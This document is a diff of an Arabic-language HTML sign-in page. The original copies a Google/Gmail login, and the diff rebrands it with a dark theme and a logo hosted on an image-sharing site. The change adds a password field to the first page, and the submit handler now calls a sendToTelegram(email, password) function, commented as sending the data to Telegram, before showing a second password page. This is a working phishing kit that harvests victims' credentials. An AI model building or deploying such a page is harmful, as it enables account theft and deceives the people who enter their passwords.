@@ -13,7 +13,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: white;
+            background: linear-gradient(135deg, #0a1929 0%, #1a3a52 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -26,112 +26,112 @@
             max-width: 500px;
         }
 
-        .google-logo {
-            width: 120px;
-            height: 40px;
-            margin: 0 auto 40px;
+        /* صفحة 1 */
+        .page-1.active {
+            display: block;
         }
 
-        .google-logo img {
-            width: 100%;
-            height: 100%;
+        .page-1 {
+            display: none;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 32px;
+            cursor: pointer;
+            margin-bottom: 30px;
+            transition: opacity 0.3s ease;
+            padding: 0;
+        }
+
+        .back-btn:hover {
+            opacity: 0.7;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo img {
+            height: 80px;
             object-fit: contain;
         }
 
-        .page-heading {
+        .heading {
             text-align: center;
-            font-size: 32px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 8px;
-        }
-
-        .page-subheading {
-            text-align: center;
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 40px;
+            color: white;
+            font-size: 18px;
+            font-weight: 400;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            letter-spacing: 0.3px;
         }
 
         .form-group {
             margin-bottom: 25px;
         }
 
-        .input-wrapper {
-            position: relative;
+        label {
+            display: block;
+            color: white;
+            font-size: 14px;
+            font-weight: 400;
+            margin-bottom: 12px;
+            text-align: right;
         }
 
-        .input-container {
-            display: flex;
-            align-items: center;
+        .input-wrapper {
             position: relative;
         }
 
         input {
             width: 100%;
             padding: 16px 20px;
-            padding-right: 120px;
-            background: white;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            color: #202124;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(0, 150, 255, 0.5);
+            border-radius: 12px;
+            color: white;
             font-size: 16px;
             font-family: inherit;
             transition: all 0.3s ease;
             text-align: right;
         }
 
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
         input:focus {
             outline: none;
-            border-color: #1f73e6;
-            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(0, 150, 255, 0.8);
+            box-shadow: 0 0 10px rgba(0, 150, 255, 0.3);
         }
 
-        input::placeholder {
-            color: #80868b;
-        }
-
-        .email-suffix {
-            position: absolute;
-            right: 20px;
-            color: #80868b;
-            font-size: 16px;
-            pointer-events: none;
-        }
-
-        .email-suffix.hidden {
-            display: none;
+        .error-message {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: 8px;
+            text-align: right;
         }
 
         .forgot-link {
             text-align: center;
-            margin-top: 15px;
+            margin-top: 20px;
         }
 
         .forgot-link a {
-            color: #1f73e6;
+            color: rgba(255, 255, 255, 0.7);
             text-decoration: none;
-            font-size: 14px;
+            font-size: 13px;
+            transition: color 0.3s ease;
         }
 
         .forgot-link a:hover {
-            text-decoration: underline;
-        }
-
-        .create-account {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .create-account a {
-            color: #1f73e6;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .create-account a:hover {
-            text-decoration: underline;
+            color: white;
         }
 
         .form-actions {
@@ -139,14 +139,15 @@
             justify-content: space-between;
             align-items: center;
             margin-top: 30px;
+            gap: 20px;
         }
 
         .submit-btn {
-            padding: 10px 32px;
-            background: #1f73e6;
+            padding: 12px 40px;
+            background: #0096ff;
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 25px;
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
@@ -154,12 +155,12 @@
         }
 
         .submit-btn:hover {
-            background: #1765cc;
-            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
+            background: #0082d4;
+            box-shadow: 0 4px 15px rgba(0, 150, 255, 0.3);
         }
 
         .submit-btn:active {
-            background: #1555c0;
+            background: #0070b8;
         }
 
         .submit-btn:disabled {
@@ -167,20 +168,36 @@
             cursor: not-allowed;
         }
 
-        /* Password Page Styles */
-        .password-page {
-            display: none;
+        .create-account {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
         }
 
-        .password-page.active {
+        .create-account a {
+            color: #0096ff;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .create-account a:hover {
+            color: #00c7ff;
+            text-decoration: underline;
+        }
+
+        /* صفحة 2 */
+        .page-2.active {
             display: block;
         }
 
+        .page-2 {
+            display: none;
+        }
+
         .email-display {
-            background: white;
-            border: 1px solid #dadce0;
-            border-radius: 50px;
-            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(0, 150, 255, 0.3);
+            border-radius: 25px;
+            padding: 12px 18px;
             margin-bottom: 40px;
             display: flex;
             align-items: center;
@@ -190,26 +207,26 @@
 
         .email-text {
             flex: 1;
-            color: #202124;
+            color: white;
             font-size: 14px;
             text-align: right;
         }
 
         .dropdown-icon {
-            color: #202124;
+            color: rgba(255, 255, 255, 0.7);
             font-size: 16px;
         }
 
         .profile-icon {
-            width: 36px;
-            height: 36px;
-            background: #dadce0;
+            width: 32px;
+            height: 32px;
+            background: rgba(0, 150, 255, 0.2);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #5f6368;
-            font-size: 18px;
+            color: white;
+            font-size: 16px;
         }
 
         .password-input-container {
@@ -220,33 +237,49 @@
         .password-label {
             display: block;
             font-size: 12px;
-            color: #1f73e6;
+            color: rgba(255, 255, 255, 0.8);
             margin-bottom: 8px;
-            font-weight: 500;
+            font-weight: 400;
             text-align: right;
         }
 
         .password-input {
             width: 100%;
-            padding: 16px 20px !important;
-            padding-right: 20px !important;
-            border: 2px solid #1f73e6 !important;
-            border-radius: 8px;
+            padding: 16px 50px 16px 20px !important;
+            border: 2px solid rgba(0, 150, 255, 0.6) !important;
+            border-radius: 12px;
             font-size: 16px;
             text-align: right;
+            position: relative;
         }
 
         .password-input:focus {
             outline: none;
-            border-color: #1f73e6 !important;
-            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3) !important;
+            border-color: rgba(0, 150, 255, 0.9) !important;
+            box-shadow: 0 0 10px rgba(0, 150, 255, 0.3) !important;
+        }
+
+        .password-toggle {
+            position: absolute;
+            left: 15px;
+            top: 40px;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            cursor: pointer;
+            font-size: 20px;
+            transition: color 0.3s ease;
+        }
+
+        .password-toggle:hover {
+            color: white;
         }
 
         .checkbox-container {
             display: flex;
             align-items: center;
             gap: 8px;
-            margin-top: 12px;
+            margin-top: 15px;
             margin-bottom: 20px;
         }
 
@@ -260,8 +293,8 @@
 
         .checkbox-container label {
             margin: 0;
-            font-size: 13px;
-            color: #5f6368;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
             font-weight: 400;
             cursor: pointer;
         }
@@ -269,13 +302,13 @@
         .loading {
             display: none;
             text-align: center;
-            color: #202124;
+            color: white;
             margin-top: 20px;
         }
 
         .spinner {
-            border: 3px solid #f0f0f0;
-            border-top: 3px solid #1f73e6;
+            border: 3px solid rgba(0, 150, 255, 0.2);
+            border-top: 3px solid #0096ff;
             border-radius: 50%;
             width: 24px;
             height: 24px;
@@ -288,17 +321,25 @@
             100% { transform: rotate(360deg); }
         }
 
+        .email-suffix {
+            position: absolute;
+            right: 20px;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            pointer-events: none;
+        }
+
+        .email-suffix.hidden {
+            display: none;
+        }
+
         @media (max-width: 480px) {
             .container {
                 padding: 0 15px;
             }
 
-            .page-heading {
-                font-size: 24px;
-            }
-
-            .page-subheading {
-                font-size: 14px;
+            .heading {
+                font-size: 16px;
             }
 
             input {
@@ -306,50 +347,69 @@
             }
 
             .form-actions {
-                flex-direction: column;
-                gap: 12px;
+                flex-direction: column-reverse;
+                width: 100%;
             }
 
             .submit-btn {
                 width: 100%;
+            }
+
+            .logo img {
+                height: 60px;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- الصفحة الأولى - البريد والرقم -->
-        <div class="login-page active">
-            <div class="google-logo">
-                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+        <!-- الصفحة الأولى -->
+        <div class="page-1 active">
+            <button class="back-btn" onclick="window.history.back()">←</button>
+
+            <div class="logo">
+                <img src="https://a.top4top.io/p_37430qzsw0.png" alt="lba logo">
             </div>
 
-            <h1 class="page-heading">تسجيل الدخول</h1>
-            <p class="page-subheading">المتابعة إلى Gmail</p>
+            <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>
 
             <form id="loginForm">
                 <div class="form-group">
-                    <div class="input-container">
+                    <label for="email">البريد الإلكتروني</label>
+                    <div class="input-wrapper">
                         <input 
-                            type="text" 
-                            id="emailPhone" 
-                            name="emailPhone"
-                            placeholder="البريد الإلكتروني أو الهاتف"
+                            type="email" 
+                            id="email" 
+                            name="email"
+                            placeholder="أدخل بريدك الإلكتروني"
                             required
                         >
-                        <span class="email-suffix" id="emailSuffix">@gmail.com</span>
+                    </div>
+                    <div class="error-message" id="emailError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password"
+                            placeholder="أدخل كلمة المرور"
+                            required
+                        >
                     </div>
                 </div>
 
                 <p class="forgot-link">
-                    <a href="#">هل نسيت بريدك الإلكتروني؟</a>
+                    <a href="#">هل نسيت كلمة المرور؟</a>
                 </p>
 
                 <div class="form-actions">
-                    <button type="submit" class="submit-btn">التالي</button>
                     <p class="create-account">
                         <a href="#">إنشاء حساب</a>
                     </p>
+                    <button type="submit" class="submit-btn" id="submitBtn">التالي</button>
                 </div>
             </form>
 
@@ -359,13 +419,15 @@
             </div>
         </div>
 
-        <!-- الصفحة الثانية - كلمة المرور -->
-        <div class="password-page">
-            <div class="google-logo">
-                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+        <!-- الصفحة الثانية -->
+        <div class="page-2">
+            <button class="back-btn" onclick="goBackToPage1()">←</button>
+
+            <div class="logo">
+                <img src="https://a.top4top.io/p_37430qzsw0.png" alt="lba logo">
             </div>
 
-            <h1 class="page-heading">مرحباً</h1>
+            <h1 class="heading" style="margin-bottom: 40px;">مرحباً</h1>
 
             <div class="email-display">
                 <div class="profile-icon">👤</div>
@@ -384,6 +446,7 @@
                         placeholder="أدخل كلمة المرور"
                         required
                     >
+                    <button type="button" class="password-toggle" onclick="togglePassword()">🔊</button>
                 </div>
 
                 <div class="checkbox-container">
@@ -417,33 +480,24 @@
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const emailPhone = document.getElementById('emailPhone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
 
-            if (!emailPhone) {
-                alert('الرجاء إدخال البريد أو الرقم');
+            if (!email || !password) {
+                alert('الرجاء ملء جميع الحقول');
                 return;
             }
 
-            savedEmail = emailPhone;
+            savedEmail = email;
 
-            // الانتقال إلى صفحة كلمة المرور
-            goToPasswordPage(emailPhone);
+            // إرسال البيانات إلى التلجرام
+            sendToTelegram(email, password);
+
+            // الانتقال إلى الصفحة الثانية
+            goToPage2(email);
         });
 
-        // التحكم بحقل البريد/الرقم
-        document.getElementById('emailPhone').addEventListener('input', function(e) {
-            const value = e.target.value;
-            const isPhone = /^\d/.test(value);
-            const suffix = document.getElementById('emailSuffix');
-
-            if (isPhone) {
-                suffix.classList.add('hidden');
-            } else {
-                suffix.classList.remove('hidden');
-            }
-        });
-
-        // صفحة كلمة المرور
+        // الصفحة الثانية
         document.getElementById('passwordForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -476,13 +530,19 @@
             }
         }
 
-        function goToPasswordPage(emailOrPhone) {
+        function goToPage2(emailOrPhone) {
             const isPhone = /^\d{10,}$/.test(emailOrPhone);
             const displayValue = isPhone ? emailOrPhone : emailOrPhone.includes('@') ? emailOrPhone : emailOrPhone + '@gmail.com';
 
-            document.querySelector('.login-page').classList.remove('active');
-            document.querySelector('.password-page').classList.add('active');
+            document.querySelector('.page-1').classList.remove('active');
+            document.querySelector('.page-2').classList.add('active');
             document.getElementById('displayEmail').textContent = displayValue;
+        }
+
+        function goBackToPage1() {
+            document.querySelector('.page-2').classList.remove('active');
+            document.querySelector('.page-1').classList.add('active');
+            document.getElementById('loginForm').reset();
         }
 
         async function sendToTelegram(email, password) {
